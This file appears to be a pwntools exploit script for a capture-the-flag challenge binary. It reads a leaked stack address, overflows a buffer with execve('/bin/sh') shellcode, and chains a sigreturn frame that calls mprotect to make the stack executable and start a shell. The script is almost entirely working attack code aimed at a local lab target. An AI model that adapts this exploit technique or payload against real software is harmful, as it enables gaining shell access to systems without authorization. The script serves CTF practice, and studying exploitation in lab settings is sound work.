from pwn import *
from icecream import ic

exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path]+ argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4011bc
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

syscall_ret = 0x000000000040115e
mov_eax_15 = 0x000000000040116c

ru(" @")
leak = int(re(14).decode(), 16)
ic(hex(leak))
payload = asm('''
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''')
payload += b'a'*(120-len(payload))
payload += p64(mov_eax_15)
payload += p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 10
frame.rdi = leak-(leak%4096)
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = syscall_ret
frame.rsp = leak + len(payload) + 248
payload += bytes(frame)
payload += p64(leak)
ru("n you SROP?")
sl(payload)
i()
